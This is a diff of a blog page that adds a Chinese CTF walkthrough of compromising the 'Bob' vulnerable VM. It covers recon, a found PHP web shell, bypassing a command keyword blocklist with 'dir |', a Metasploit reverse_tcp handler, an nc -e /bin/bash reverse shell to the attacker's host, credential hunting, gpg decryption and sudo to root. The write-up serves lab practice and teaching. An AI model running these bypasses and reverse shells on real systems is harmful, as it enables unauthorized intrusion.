@@ -18,11 +18,11 @@
     <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
     <title>
         
-        正在开新坑中.....｜Elapse&#39; blog
+        JIS-CTF BOB靶机渗透笔记｜Elapse&#39; blog
         
     </title>
 
-    <link rel="canonical" href="https://Ernket.github.io/2018/06/29/新坑/">
+    <link rel="canonical" href="https://Ernket.github.io/2018/06/29/JIS-CTF BOB靶机渗透笔记/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -153,7 +153,7 @@
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
                 <div class="post-heading">
-                    <h1>正在开新坑中.....</h1>
+                    <h1>JIS-CTF BOB靶机渗透笔记</h1>
                     
                     <span class="meta">
                          作者 Elapse
@@ -173,7 +173,7 @@
     </div>
     <div class="post-title-haojen">
         <span>
-            正在开新坑中.....
+            JIS-CTF BOB靶机渗透笔记
         </span>
     </div>
 </header>
@@ -184,7 +184,18 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <p>新坑正在填，也许很快就会发了，也许几个月后才发（笑）</p>
+                <p>这个靶机相比于上一个可以说是很难了，上一个是网站源代码里面就有账号密码，而且上传漏洞就摆在那里，没什么难度，不多说，先附上<a href="https://pan.baidu.com/s/1LbRiw2Uwlzg0iLk26MmLjA" target="_blank" rel="noopener">下载链接</a> ,密码：gyy1，接着就是不正式的开始了（笑）</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机都是没有给你IP地址的，我通过扫网段的方式得到了，所以直接kan’k’n<br><img src="http://t1.aixinxi.net/o_1ch5e6euc124l1obihqlhhe1feea.png-j.jpg" alt=""><br>只有一个80（不知道还有没有别的，通过改端口使得nmap扫不到），直接登网站看看有什么<br><img src="http://t1.aixinxi.net/o_1ch5e91r7d4u1rj01stj4j3fspa.png-j.jpg" alt=""></p>
+<h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><p>可以说是很简陋了，网站先都浏览一遍，看看有没有什么有意思的<br><img src="http://t1.aixinxi.net/o_1ch5eb4li1179ppgmue5l81higa.png-j.jpg" alt=""><br>emmmmmm，不给登录，也没有注册，估计还是得爬一下网站子目录了，开启burpsuite<br><img src="http://t1.aixinxi.net/o_1ch5ecvl811ho1a0ou6pl73gula.png-j.jpg" alt=""><br>很意外，找到了个shell的php文件，可以执行命令<br><img src="http://t1.aixinxi.net/o_1ch5eeee91mmssihau51eqji63a.png-j.jpg" alt=""><br>先输入ls看看有什么文件<br><img src="http://t1.aixinxi.net/o_1ch5eg6lftl11i2114a18cubbba.png-j.jpg" alt=""><br>可以说是很嘲讽了，网站屏蔽了特殊的字符，随便输入了几个命令可以推断出它屏蔽的是以下几个<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">ls</span><br><span class="line">netcat</span><br><span class="line">ssh</span><br><span class="line">wget</span><br><span class="line">ping</span><br><span class="line">cat</span><br><span class="line">nc</span><br></pre></td></tr></table></figure></p>
+<p>很优秀，防止wget下载php木马，nc开启端口，可以说是很用心良苦了，但是很简答就能绕过，而且dir也能用，那么就开始绕过，因为他是只检测前面的，所以你前面不要出现这些就好了，看路径的正确例子<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dir</span> | <span class="keyword">pwd</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://t1.aixinxi.net/o_1ch5epeolvk91hg4i878v33ira.png-j.jpg" alt=""><br>成功绕过后，开始想办法回弹shell吧，我这里用的方法还是使用handler，先设置好模块<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload linux/x86/shell/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/shell/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.201</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.201</span></span><br><span class="line">msf exploit(multi/handler) &gt; set lport <span class="number">4444</span></span><br><span class="line">lport =&gt; <span class="number">4444</span></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.201</span>:<span class="number">4444</span> </span><br><span class="line">[*] Sending stage (<span class="number">36</span> bytes) to <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.118</span></span><br><span class="line">[*] Command shell session <span class="number">1</span> opened (<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.201</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="meta">.1</span><span class="meta">.118</span>:<span class="number">51784</span>) <span class="meta">at</span> <span class="number">2018</span>-<span class="number">06</span>-<span class="number">29</span> <span class="number">17</span>:<span class="number">12</span>:<span class="number">17</span> +<span class="number">0800</span></span><br></pre></td></tr></table></figure></p>
+<p>接着在网站建立一个反向shell<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir | nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.201</span> <span class="number">4444</span> -e /bin/bash</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://t1.aixinxi.net/o_1ch5f4qfk1dqj18vo10tukcq1ldga.png-j.jpg" alt=""><br>这个时候我就得到了一个反向shell了，为了获得交互式shell，这里用个新鲜的命令<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span><span class="bash"></span></span><br><span class="line"><span class="bash">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span></span><br></pre></td></tr></table></figure></p>
+<p><img src="http://t1.aixinxi.net/o_1ch5f7r7o1pih1qpu1shdtmoefba.png-j.jpg" alt=""><br>这样就方便看当前路径了，开始干活，先逛一逛home目录（用户目录），在用户elliots的目录下看到一个<code>theadminisdumb.txt</code>，有点奇怪，cat一下<br><img src="http://t1.aixinxi.net/o_1ch5feqbh1org1sgti4t1r1p1684a.png-j.jpg" alt=""><br>找到了用户elliots的密码是<code>theadminisdumb</code>，在去别的用户的目录逛一逛，进入用户bob的目录，<code>ls -a</code>一下看看有没有隐藏的文件<br><img src="http://t1.aixinxi.net/o_1ch5fgq8k9ns1mgfigb1n3c2vva.png-j.jpg" alt=""><br>可以，找到了个<code>.old_passwordfile.html</code>，看看内容有什么好东西<br><img src="http://t1.aixinxi.net/o_1ch5flljo1jke1uknotsl1c1pvta.png-j.jpg" alt=""><br>看不懂是什么东西。。算了，先记着，在主文件夹<code>Ducuments</code>下发现一个gpg加密的文件，cat一下导致卡住了。被迫重新反弹一个shell，后来百度才知道，gpg是加密的，而且要有对应的公钥<br><img src="http://t1.aixinxi.net/o_1ch5fote1qe6t161s6bi98rg2a.png-j.jpg" alt=""><br>确定了一个思路，那就是这电脑里有公钥的提示，到处逛一逛看看能不能找到，看到目录下还有一个文件夹，<code>Secret</code>，这里可以说作者非常恶意了，因为你要进差不多4个文件夹才到头<br><img src="http://t1.aixinxi.net/o_1ch5fvn66kta1o50s1f1g2qiv5a.png-j.jpg" alt=""><br>最后看到了一个sh文件，先cat一下看看内容<br><img src="http://t1.aixinxi.net/o_1ch5g0uam2dr4611tls1t761i81a.png-j.jpg" alt=""><br>密码的提示应该就是这个了，<code>HARPOCRATES</code>，和藏头诗一样，每一行的首字母组成一个单词，HARPOCRATES中文名是哈尔波克拉特斯(翻译来的，是不是这个我也不知道)，是希腊代表秘密和保密的神，接着用这个公钥来解密刚才的gpg文件<br><img src="http://t1.aixinxi.net/o_1ch5g7egfp51gtj1p3hh3hhaga.png-j.jpg" alt=""><br>可以看到密码是<code>b0bcat_</code>(这里要注意一下，www-data是没有权限来解密的，所以你得用一开始找到的用户elliots的密码来切换到elliots，然后再解密，)下面是解密格式<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --batch --passphrase <span class="tag">&lt;<span class="name">公钥</span>&gt;</span> -d <span class="tag">&lt;<span class="name">文件</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>接着我们用刚得到的密码切换至bob用户，但是bob是没有权限进入root目录的，所以这里用<code>sudo bash</code>来升级成root<br><img src="http://t1.aixinxi.net/o_1ch5geqv2jkltmofv516ql1hefa.png-j.jpg" alt=""><br>开始找flag.txt文件吧<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> / -<span class="built_in">name</span> <span class="built_in">flag</span>.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://t1.aixinxi.net/o_1ch5gga481b9s1ndh1uca1qb2i30a.png-j.jpg" alt=""><br>发现flag.txt文件，直接查看<br><img src="http://t1.aixinxi.net/o_1ch5gh2b71toa1mp91dvkrf4nn6a.png-j.jpg" alt=""><br>结束</p>
+<hr>
+<p>这个靶机可以说是很有意思了，确实跟真的环境差不多吧，而且还有一个非常有意思的东西，你在webshell那里尝试echo写一个php木马的时候，他会回显一个这个玩意<br><img src="http://t1.aixinxi.net/o_1ch5gkmdbncf1lor1dmjq12jkta.png-j.jpg" alt=""><br>最后说一句，真是太好玩了哈哈哈哈哈哈</p>
 
                 <hr>
                 
@@ -210,7 +221,7 @@
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开始渗透"><span class="toc-text">开始渗透</span></a></li></ol>
                 </div>
             </div>
         </div>
